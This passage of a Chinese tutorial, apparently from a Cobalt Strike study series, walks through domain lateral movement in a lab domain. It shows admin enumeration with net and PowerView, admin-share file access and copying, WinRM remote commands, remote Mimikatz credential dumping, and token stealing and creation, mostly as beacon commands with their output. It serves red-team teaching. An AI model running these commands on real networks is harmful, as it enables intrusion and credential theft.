Tasked beacon to run: net localgroup <span class="token string">"administrators"</span> <span class="token operator">/</span>domain<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 70 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:别名     administrators注释     管理员对计算机<span class="token operator">/</span>域有不受限制的完全访问权成员<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>administratorDomain AdminsDanielEnterprise Admins命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Net 模块</strong></p><p>beacon 的 net 模块也可以帮助我们，下面的命令中 <code>TARGET</code> 的意思是一个域控制器或者是任何想查看的组名，比如企业管理员、域管理员等等</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net <span class="token function">group</span> \\TARGET <span class="token function">group</span> name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以运行下面的命令，这会连接任意目标来获取列表</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net localgroup \\TARGET <span class="token function">group</span> name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="本地管理员"><a href="#本地管理员" class="headerlink" title="本地管理员"></a>本地管理员</h4><p><strong>Net 模块</strong></p><p>本地管理员可能是一个域账户，因此如果想把一个系统作为目标，应该找到谁是这个系统的本地管理员，因为如果获得了它的密码哈希值或者凭据就可以伪装成那个用户。</p><p>beacon 的 net 模块可以在系统上从一个没有特权的关联中查询本地组和用户。</p><p>在 beacon 控制台中运行下面命令可以获得一个目标上的群组列表</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net localgroup \\TARGET<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果想获取群组的列表，可运行下面的命令来获得一个群组成员的名单列表。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net localgroup \\TARGET <span class="token function">group</span> name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> net localgroup \\WinDC administrators<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run net localgroup administrators on WinDC<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 104510 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:Members of administrators on \\WinDC:TEAMSSIX\AdministratorTEAMSSIX\DanielTEAMSSIX\Enterprise AdminsTEAMSSIX\Domain Admins<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>PowerView 模块</strong></p><p>PowerView 使用下面的命令能够在一个主机上找到本地管理员，这条命令实际上通过管理员群组找到同样的群组并且把成员名单返回出来。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Get-Netlocalgroup</span> <span class="token operator">-</span>hostname TARGET<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> powershell <span class="token function">Get-Netlocalgroup</span> <span class="token operator">-</span>Hostname WinDC<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">Get-Netlocalgroup</span> <span class="token operator">-</span>Hostname WinDC<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 385 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:ComputerName : WinDCAccountName  : teamssix<span class="token punctuation">.</span>com<span class="token operator">/</span>AdministratorIsDomain     : TrueIsGroup      : FalseSID          : S<span class="token operator">-</span>1<span class="token operator">-</span>5<span class="token operator">-</span>22<span class="token operator">-</span>3301978333<span class="token operator">-</span>983314215<span class="token operator">-</span>684642015<span class="token operator">-</span>500Description  : Disabled     : LastLogin    : 2020<span class="token operator">/</span>8<span class="token operator">/</span>17 22:21:23PwdLastSet   : PwdExpired   : UserFlags    : ComputerName : WinDCAccountName  : teamssix<span class="token punctuation">.</span>com<span class="token operator">/</span>Daniel……内容过多，余下部分省略……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3、无需恶意软件"><a href="#3、无需恶意软件" class="headerlink" title="3、无需恶意软件"></a>3、无需恶意软件</h2><p>如果一个系统信任我们为本地管理员权限，那么我们可以在那个系统上干什么呢？</p><p><strong>查看共享文件</strong></p><p>比如我们可以通过运行下面的命令来列出 C:\foo 的共享文件</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell <span class="token function">dir</span> \\host\C$\foo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell <span class="token function">dir</span> \\WinDC\C$<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">dir</span> \\WinDC\C$<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 55 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output: 驱动器 \\WinDC\C$ 中的卷没有标签。 卷的序列号是 F269<span class="token operator">-</span>89A7 \\WinDC\C$ 的目录2020<span class="token operator">/</span>06<span class="token operator">/</span>24  09:29    &lt;<span class="token function">DIR</span>>          inetpub2009<span class="token operator">/</span>07<span class="token operator">/</span>14  11:20    &lt;<span class="token function">DIR</span>>          PerfLogs2020<span class="token operator">/</span>07<span class="token operator">/</span>16  21:24    &lt;<span class="token function">DIR</span>>          Program Files2020<span class="token operator">/</span>07<span class="token operator">/</span>16  21:52    &lt;<span class="token function">DIR</span>>          Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>2020<span class="token operator">/</span>07<span class="token operator">/</span>17  23:00    &lt;<span class="token function">DIR</span>>          Users2020<span class="token operator">/</span>07<span class="token operator">/</span>26  00:55    &lt;<span class="token function">DIR</span>>          Windows               0 个文件              0 字节               6 个目录 28<span class="token punctuation">,</span>500<span class="token punctuation">,</span>393<span class="token punctuation">,</span>984 可用字节<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>复制文件</strong></p><p>比如运行下面的命令将 <code>secrets.txt</code>文件复制到当前目录。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell <span class="token function">copy</span> \\host\C$\foo\secrets<span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell <span class="token function">copy</span> \\WinDC\C$\foo\secrets<span class="token punctuation">.</span>txt<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">copy</span> \\WinDC\C$\foo\secrets<span class="token punctuation">.</span>txt<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 93 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:已复制         1 个文件。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>查看文件列表</strong></p><p>比如运行下面的命令。其中 /S 表示列出指定目录及子目录所有文件，/B 表示使用空格式，即没有标题或摘要信息。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell <span class="token function">dir</span> <span class="token operator">/</span>S <span class="token operator">/</span>B \\host\C$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell <span class="token function">dir</span> <span class="token operator">/</span>S <span class="token operator">/</span>B \\WinDC\C$\Users<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">dir</span> <span class="token operator">/</span>S <span class="token operator">/</span>B \\WinDC\C$\Users<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 67 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:\\WinDC\C$\Users\administrator\\WinDC\C$\Users\Classic <span class="token punctuation">.</span>NET AppPool\\WinDC\C$\Users\Daniel\\WinDC\C$\Users\Public\\WinDC\C$\Users\administrator\Contacts\\WinDC\C$\Users\administrator\Desktop\\WinDC\C$\Users\administrator\Documents\\WinDC\C$\Users\administrator\Downloads\\WinDC\C$\Users\administrator\Favorites……内容过多，余下部分省略……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>使用 WinRM 运行命令</strong></p><p>WinRM 运行在 5985 端口上，WinRM 是 Windows 远程管服务，使用 WinRM 可以使远程管理更容易一些。</p><p>如果想利用 WinRM 运行命令则可以使用下面的命令。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">powershell <span class="token function">Invoke-Command</span> <span class="token operator">-</span>ComputerName TARGET <span class="token operator">-</span>ScriptBlock <span class="token punctuation">&#123;</span>command here<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> powershell <span class="token function">Invoke-Command</span> <span class="token operator">-</span>ComputerName WinDC <span class="token operator">-</span>ScriptBlock <span class="token punctuation">&#123;</span> net localgroup administrators<span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">Invoke-Command</span> <span class="token operator">-</span>ComputerName WinDC <span class="token operator">-</span>ScriptBlock <span class="token punctuation">&#123;</span> net localgroup administrators<span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 303 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:别名     administrators注释     管理员对计算机<span class="token operator">/</span>域有不受限制的完全访问权成员<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>AdministratorDomain AdminsDanielEnterprise Admins命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注：如果命令运行失败可能是因为 WinRM 配置原因，可在 powershell 环境下运行 <code>winrm quickconfig</code>命令，输入 <code>y</code> 回车即可。</p><p>命令运行后的结果，WinRM 也将通过命令行进行显示，因此可以使用 Powershell 的 Invoke 命令来作为远程工具，而不使用其他的恶意软件来控制系统。</p><p><strong>通过 WinRM 运行 Mimikatz</strong></p><p>更进一步，甚至可以使用 PowerSploit 来通过 WinRM 运行 Mimikatz，只需要先导入 Invoke-Mimikatz.ps1 文件，再执行以下命令即可。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">powershell<span class="token operator">-</span>import <span class="token operator">/</span>path<span class="token operator">/</span>to<span class="token operator">/</span><span class="token function">Invoke-Mimikatz</span><span class="token punctuation">.</span>ps1powershell <span class="token function">Invoke-Mimikatz</span> <span class="token operator">-</span>ComputerName TARGET<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>注：之前提了很多次的 PowerView 也是 PowerSploit 项目里众多 ps1 文件之一，Mimikatz 的 ps1 文件在 PowerSploit 项目的 Exfiltration 目录下，PowerSploit 项目下载地址：<a href="https://github.com/PowerShellMafia/PowerSploit/">https://github.com/PowerShellMafia/PowerSploit/</a></p></blockquote><p>因为 beacon 上传文件大小限制在1MB，而 Invoke-Mimikatz.ps1 文件大小在 2 MB 多，因此直接运行 <code>powershell-import</code> 导入该文件会报错，这里可以选择使用 beacon 中的 upload 命令或者在当前会话的 File Browser 图形界面中上传该文件。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">upload C:\path\<span class="token function">Invoke-Mimikatz</span><span class="token punctuation">.</span>ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上传之后通过 dir 命令可以查看到文件被上传到了C盘下，之后可以运行以下命令来导入该文件。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">powershell <span class="token function">import-module</span> C:\<span class="token function">Invoke-Mimikatz</span><span class="token punctuation">.</span>ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后再运行以下命令就能通过 WinRM 执行 Mimikatz 了。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">powershell <span class="token function">Invoke-Mimikatz</span> <span class="token operator">-</span>ComputerName TARGET<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果提示<code>无法将“Invoke-Mimikatz”项识别为 cmdlet、函数……</code>，则可以将两条命令以分号合并在一起运行，即：</p><pre class="line-numbers language-none"><code class="language-none">powershell import-module C:\Invoke-Mimikatz.ps1 ; Invoke-Mimikatz -ComputerName TARGET<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> powershell <span class="token function">import-module</span> C:\<span class="token function">Invoke-Mimikatz</span><span class="token punctuation">.</span>ps1 <span class="token punctuation">;</span> <span class="token function">Invoke-Mimikatz</span> <span class="token operator">-</span>ComputerName WinDC<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">import-module</span> C:\<span class="token function">Invoke-Mimikatz</span><span class="token punctuation">.</span>ps1 <span class="token punctuation">;</span> <span class="token function">Invoke-Mimikatz</span> <span class="token operator">-</span>ComputerName WinDC<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 287 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:  <span class="token punctuation">.</span><span class="token comment">#####.   mimikatz 2.1 (x64) built on Nov 10 2016 15:31:14</span> <span class="token punctuation">.</span><span class="token comment">## ^ ##.  "A La Vie, A L'Amour"</span> <span class="token comment">## / \ ##  /* * *</span> <span class="token comment">## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span> <span class="token string">'## v ##'</span>   http:<span class="token operator">/</span><span class="token operator">/</span>blog<span class="token punctuation">.</span>gentilkiwi<span class="token punctuation">.</span>com<span class="token operator">/</span>mimikatz             <span class="token punctuation">(</span>oe<span class="token punctuation">.</span>eo<span class="token punctuation">)</span>  <span class="token string">'#####'</span>                                     with 20 modules <span class="token operator">*</span> <span class="token operator">*</span> <span class="token operator">*</span><span class="token operator">/</span>mimikatz<span class="token punctuation">(</span>powershell<span class="token punctuation">)</span> <span class="token comment"># sekurlsa::logonpasswords</span>Authentication Id : 0 <span class="token punctuation">;</span> 314628 <span class="token punctuation">(</span>00000000:0004cd04<span class="token punctuation">)</span>Session           : Interactive <span class="token keyword">from</span> 1User Name         : administratorDomain            : TEAMSSIXLogon Server      : WinDCLogon Time        : 2020<span class="token operator">/</span>8<span class="token operator">/</span>20 23:53:08SID               : S<span class="token operator">-</span>1<span class="token operator">-</span>5<span class="token operator">-</span>22<span class="token operator">-</span>3301978333<span class="token operator">-</span>983314215<span class="token operator">-</span>684642015<span class="token operator">-</span>500msv : <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary <span class="token operator">*</span> Username : Administrator……内容过多，余下部分省略……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs16-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>终于把碰到的坑都填完了，睡觉……</p><h2 id="4、获取信任"><a href="#4、获取信任" class="headerlink" title="4、获取信任"></a>4、获取信任</h2><p>如果当前账号权限被系统认为是本地管理员权限，那么就可以执行很多管理员才能做的事，接下来就来看一下这样的一个过程是如何工作的，其中会涉及到以下要点：</p><p>1、<code>Access Token</code> 登录令牌</p><p>2、<code>Credentials</code> 凭证</p><p> 3、<code>Password Hashes</code> 密码哈希</p><p>4、<code>Kerberos Tickets</code> 登录凭据</p><h3 id="登录令牌"><a href="#登录令牌" class="headerlink" title="登录令牌"></a>登录令牌</h3><ul><li>登录令牌在登录之后被创建</li><li>与每个进程和线程相关联</li><li>包括：<ul><li>用户和用户组的信息</li><li>本地计算机上的特权列表</li><li>限制（删除用户和用户组的权限）</li><li>参考凭证（支持单点登录）</li></ul></li><li>一直保存在内存中，直到系统重启</li></ul><p><em>以下是令牌窃取的过程：</em></p><ul><li>使用 <code>ps</code> 列出进程</li><li>使用 <code>steal_token [pid]</code> 窃取令牌</li><li>使用 <code>getuid</code> 找到你是谁</li><li>使用 <code>rev2self</code> 移除令牌</li></ul><p>接下来将对这些命令进行演示，目前有一个 SYSTEM 权限的会话，该会话在 WIN-72A8ERDSF2P 主机下，此时想查看 WIN-P2AASSD1AF1 主机下的文件（WIN-P2AASSD1AF1 主机是 TEAMSSIX 域的域控制器），那么直接运行 dir 会提示拒绝访问。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell <span class="token function">dir</span> \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">dir</span> \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 55 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:拒绝访问。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时，先用 <code>ps</code> 查看一下当前系统进程信息。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> <span class="token function">ps</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to list processes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 12 bytes<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token keyword">Process</span> List PID   PPID  Name                         Arch  Session     User <span class="token operator">--</span><span class="token operator">-</span>   <span class="token operator">--</span>-<span class="token operator">-</span>  <span class="token operator">--</span>-<span class="token operator">-</span>                         <span class="token operator">--</span>-<span class="token operator">-</span>  <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>     <span class="token operator">--</span>-<span class="token operator">--</span> 0     0     <span class="token namespace">[System Process]</span>                                4     0     System                       x64   0           NT AUTHORITY\SYSTEM……内容太多，此处省略…… 3720  524   taskhost<span class="token punctuation">.</span>exe                 x64   2           WIN<span class="token operator">-</span>72A8ERDSF2P\Administrator 4092  236   dwm<span class="token punctuation">.</span>exe                      x64   3           TEAMSSIX\Administrator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过进程信息可以发现 TEAMSSIX 域下的管理员账户此时在当前 SYSTEM 会话的主机上是登录着的，使用 <code>steal_token [pid]</code> 命令窃取 TEAMSSIX\Administrator 账户的令牌</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> steal_token 4092<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to steal token <span class="token keyword">from</span> PID 4092<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 12 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Impersonated TEAMSSIX\administrator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>查看一下当前会话 uid</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> getuid<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to get userid<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 8 bytes<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> You are TEAMSSIX\administrator <span class="token punctuation">(</span>admin<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>再次尝试获取域控制器主机下的文件</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell <span class="token function">dir</span> \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">dir</span> \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 55 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output: 驱动器 \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$ 中的卷没有标签。 卷的序列号是 F269<span class="token operator">-</span>89A7 \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$ 的目录2020<span class="token operator">/</span>07<span class="token operator">/</span>16  21:24    &lt;<span class="token function">DIR</span>>          Program Files2020<span class="token operator">/</span>07<span class="token operator">/</span>16  21:52    &lt;<span class="token function">DIR</span>>          Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>2020<span class="token operator">/</span>07<span class="token operator">/</span>17  23:00    &lt;<span class="token function">DIR</span>>          Users2020<span class="token operator">/</span>07<span class="token operator">/</span>26  00:55    &lt;<span class="token function">DIR</span>>          Windows               0 个文件      0 字节               4 个目录 28<span class="token punctuation">,</span>493<span class="token punctuation">,</span>299<span class="token punctuation">,</span>712 可用字节<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs17-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>发现可以成功访问了，使用  <code>rev2self</code> 可移除当前窃取的令牌</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> rev2self<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to revert token<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 8 bytes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>再次查看 uid 发现变成了原来的 SYSTEM 权限，此时 WIN-P2AASSD1AF1 主机上的文件也拒绝访问了。</p> <pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> getuid<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to get userid<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 8 bytes<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> You are NT AUTHORITY\SYSTEM <span class="token punctuation">(</span>admin<span class="token punctuation">)</span>beacon> shell <span class="token function">dir</span> \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">dir</span> \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 55 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:拒绝访问。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="凭证"><a href="#凭证" class="headerlink" title="凭证"></a>凭证</h3><p>1、使用 make_token 创建一个令牌</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">make_token DOMAIN\user password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在运行命令之前，需要知道要获取令牌用户的密码，这里可以使用 mimikatz 进行获取，具体的方法可参考<a href="https://teamssix.com/year/200419-150600.html">《CS学习笔记 | 14、powerup提权的方法》</a>这一节中的介绍。</p><p>这里还是和上文一样的环境，在一个 SYSTEM 会话下，获取 TEAMSSIX\administrator 账号令牌，使用 mimikatz 可以得知 TEAMSSIX\administrator 账号密码为 Test111!，接下来使用 <code>make_token</code> 命令。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> make_token TEAMSSIX\administrator Test111<span class="token operator">!</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to create a token <span class="token keyword">for</span> TEAMSSIX\administrator<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 53 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Impersonated NT AUTHORITY\SYSTEMbeacon> shell <span class="token function">dir</span> \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">dir</span> \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 55 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output: 驱动器 \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$ 中的卷没有标签。 卷的序列号是 F269<span class="token operator">-</span>89A7 \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$ 的目录2020<span class="token operator">/</span>07<span class="token operator">/</span>16  21:24    &lt;<span class="token function">DIR</span>>          Program Files2020<span class="token operator">/</span>07<span class="token operator">/</span>16  21:52    &lt;<span class="token function">DIR</span>>          Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>2020<span class="token operator">/</span>07<span class="token operator">/</span>17  23:00    &lt;<span class="token function">DIR</span>>          Users2020<span class="token operator">/</span>07<span class="token operator">/</span>26  00:55    &lt;<span class="token function">DIR</span>>          Windows               0 个文件      0 字节               4 个目录 28<span class="token punctuation">,</span>493<span class="token punctuation">,</span>299<span class="token punctuation">,</span>712 可用字节               beacon> powershell <span class="token function">Invoke-Command</span> <span class="token operator">-</span>computer WIN<span class="token operator">-</span>P2AASSD1AF1 <span class="token operator">-</span>ScriptBlock <span class="token punctuation">&#123;</span>whoami<span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">Invoke-Command</span> <span class="token operator">-</span>computer WIN<span class="token operator">-</span>P2AASSD1AF1 <span class="token operator">-</span>ScriptBlock <span class="token punctuation">&#123;</span>whoami<span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 231 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:teamssix\administrator<span aria-hidden="true" 